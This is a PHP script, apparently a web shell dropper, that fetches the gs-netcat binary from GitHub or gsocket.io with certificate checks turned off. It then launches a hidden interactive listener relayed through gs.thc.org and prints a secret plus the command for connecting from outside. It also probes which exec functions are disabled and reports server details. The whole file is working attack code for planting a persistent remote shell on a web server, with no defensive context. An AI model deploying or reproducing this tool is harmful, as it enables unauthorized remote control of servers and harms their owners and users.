<?php
/**
 * gsx.php — standalone, no /x dependency
 *
 * Downloads gs-netcat directly via PHP, spawns listener, prints secret + connect command.
 * Handles: PHP 8, disabled exec partially, missing curl/wget, PATH issues.
 */

error_reporting(E_ALL);
@set_time_limit(0);
@ini_set('memory_limit', '256M');
header('Content-Type: text/plain; charset=utf-8');

/* ---------- CONFIG ---------- */
$GS_HOST    = 'gs.thc.org';
$GS_PORT    = 7350;
$SECRET_LEN = 16;
$ALPHA      = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';

$WORKDIR = sys_get_temp_dir() . '/.gsx_' . substr(md5(__FILE__), 0, 8);
$BIN     = $WORKDIR . '/gs-netcat';
$KEY     = $WORKDIR . '/.secret';

@mkdir($WORKDIR, 0700, true);
putenv('PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin');

/* ---------- HELPERS ---------- */
function sh($c) {
    if (function_exists('shell_exec')) {
        $r = @shell_exec($c . ' 2>&1');
        if ($r !== null) return (string)$r;
    }
    if (function_exists('exec')) {
        $o = []; @exec($c . ' 2>&1', $o);
        return implode("\n", $o);
    }
    return '';
}
function sh_bg($c) {
    /* spawn detached background process */
    if (function_exists('shell_exec')) {
        @shell_exec($c . ' > /dev/null 2>&1 &');
        return true;
    }
    if (function_exists('exec')) {
        @exec($c . ' > /dev/null 2>&1 &');
        return true;
    }
    return false;
}
function have_exec() {
    return function_exists('shell_exec') || function_exists('exec');
}
function detect_arch() {
    $u = php_uname('m');
    $map = [
        'x86_64' => 'x86_64', 'amd64' => 'x86_64',
        'aarch64' => 'aarch64', 'arm64' => 'aarch64',
        'armv7l' => 'armv7l', 'armv6l' => 'armv6l',
        'i686' => 'x86_64', 'i386' => 'x86_64',
    ];
    foreach ($map as $k => $v) {
        if (stripos($u, $k) !== false) return $v;
    }
    return 'x86_64';
}
function http_get($url, $max = 33554432) {
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_TIMEOUT        => 120,
            CURLOPT_USERAGENT      => 'curl/8.5.0',
        ]);
        $d = curl_exec($ch);
        curl_close($ch);
        if ($d !== false && strlen($d) > 0 && strlen($d) < $max) return $d;
    }
    $ctx = stream_context_create([
        'http' => ['timeout' => 120, 'user_agent' => 'curl/8.5.0'],
        'ssl'  => ['verify_peer' => false, 'verify_peer_name' => false],
    ]);
    $d = @file_get_contents($url, false, $ctx);
    if ($d === false || strlen($d) === 0 || strlen($d) >= $max) return false;
    return $d;
}
function gen_secret() {
    global $SECRET_LEN, $ALPHA;
    $s = '';
    for ($i = 0; $i < $SECRET_LEN; $i++) $s .= $ALPHA[random_int(0, strlen($ALPHA) - 1)];
    return $s;
}
function valid_secret($s) { return (bool)preg_match('/^[A-Za-z0-9]{16}$/', (string)$s); }
function tcp_check($host, $port, $to = 5) {
    $fp = @fsockopen($host, $port, $e, $es, $to);
    if ($fp) { fclose($fp); return true; }
    return false;
}

/* ---------- SECRET ---------- */
$secret = is_file($KEY) ? trim(@file_get_contents($KEY)) : '';
if (!valid_secret($secret)) {
    $secret = gen_secret();
    @file_put_contents($KEY, $secret, LOCK_EX);
    @chmod($KEY, 0600);
}

/* ---------- DOWNLOAD BINARY ---------- */
$log = [];
$arch = detect_arch();
$log[] = "arch: $arch";

if (!is_file($BIN) || @filesize($BIN) < 10000) {
    $urls = [
        "https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_linux-{$arch}",
        "https://gsocket.io/dl/gs-netcat_linux-{$arch}",
        "https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-{$arch}",
    ];
    foreach ($urls as $u) {
        $d = http_get($u);
        if ($d !== false && strlen($d) > 10000) {
            $tmp = $BIN . '.dl';
            if (@file_put_contents($tmp, $d) !== false && @filesize($tmp) > 10000) {
                @rename($tmp, $BIN);
                @chmod($BIN, 0755);
                $log[] = "downloaded: " . strlen($d) . " bytes from $u";
                break;
            }
            @unlink($tmp);
        }
        $log[] = "failed: $u";
    }
}
$bin_ok = is_file($BIN) && @filesize($BIN) > 10000;

/* ---------- KILL OLD, SPAWN LISTENER ---------- */
$spawn_ok = false;
$pid = '';
if ($bin_ok && have_exec()) {
    sh('pkill -f "gs-netcat.*' . escapeshellarg($secret) . '" 2>/dev/null');
    usleep(400000);

    $cmd = escapeshellarg($BIN) . ' -l -i -s ' . escapeshellarg($secret);
    sh_bg($cmd);
    usleep(1200000);

    $pid = trim(sh('pgrep -f "gs-netcat.*' . escapeshellarg($secret) . '" 2>/dev/null | head -1'));
    $spawn_ok = $pid !== '';
    $log[] = "spawn: " . ($spawn_ok ? "PID $pid" : "failed");
}

/* ---------- CHECK GSRN REACHABILITY ---------- */
$r7350 = tcp_check($GS_HOST, 7350, 5);
$r443  = $r7350 ?: tcp_check($GS_HOST, 443, 5);

/* ---------- OUTPUT ---------- */
echo "============================================================\n";
echo " GSOCKET DEPLOY\n";
echo "============================================================\n\n";
echo "HOST       : " . (@gethostname() ?: 'unknown') . "\n";
echo "PHP        : " . PHP_VERSION . " (" . PHP_SAPI . ")\n";
echo "EXEC       : " . (have_exec() ? 'YES' : 'NO — disable_functions blocks shell_exec/exec') . "\n";
echo "WORKDIR    : $WORKDIR\n";
echo "BIN        : " . ($bin_ok ? "$BIN (" . @filesize($BIN) . " bytes)" : 'MISSING') . "\n";
echo "PID        : " . ($pid ?: 'NOT RUNNING') . "\n";
echo "GSRN :7350 : " . ($r7350 ? 'REACHABLE' : 'BLOCKED') . "\n";
echo "GSRN :443  : " . ($r443  ? 'REACHABLE' : 'BLOCKED') . "\n";
echo "\n";
echo "------------------------------------------------------------\n";
echo " SECRET\n";
echo "------------------------------------------------------------\n\n";
echo "$secret\n\n";
echo "------------------------------------------------------------\n";
echo " CONNECT FROM YOUR MACHINE\n";
echo "------------------------------------------------------------\n\n";
if ($spawn_ok) {
    echo "gs-netcat -i $secret\n\n";
    if (!$r7350 && $r443) {
        echo "# port 7350 blocked — pakai 443:\n";
        echo "gs-netcat -i $secret -p 443\n";
    }
} else {
    echo "[!] Listener belum aktif.\n";
    if (!$bin_ok) {
        echo "    Binary gagal diunduh. Upload manual ke: $BIN\n";
        echo "    chmod +x $BIN\n";
    }
    if (!have_exec()) {
        echo "    shell_exec/exec disabled. Tidak bisa spawn listener dari PHP.\n";
        echo "    Kalau ada akses shell lain, jalankan:\n";
        echo "    $BIN -l -i -s $secret\n";
    } elseif ($bin_ok) {
        echo "    Coba akses ulang file ini, atau jalankan manual:\n";
        echo "    $BIN -l -i -s $secret\n";
    }
}
echo "\n============================================================\n";

/* ---------- DEBUG LOG (optional) ---------- */
if (isset($_GET['debug']) && $_GET['debug'] === '1') {
    echo "\nDEBUG:\n";
    foreach ($log as $l) echo "  - $l\n";
    echo "\n";
    echo "BIN perms : " . (@substr(sprintf('%o', @fileperms($BIN)), -4) ?: '?') . "\n";
    echo "WORKDIR   : " . (@is_writable($WORKDIR) ? 'writable' : 'NOT writable') . "\n";
    echo "disable   : " . ini_get('disable_functions') . "\n";
    echo "open_basedir: " . ini_get('open_basedir') . "\n";
}
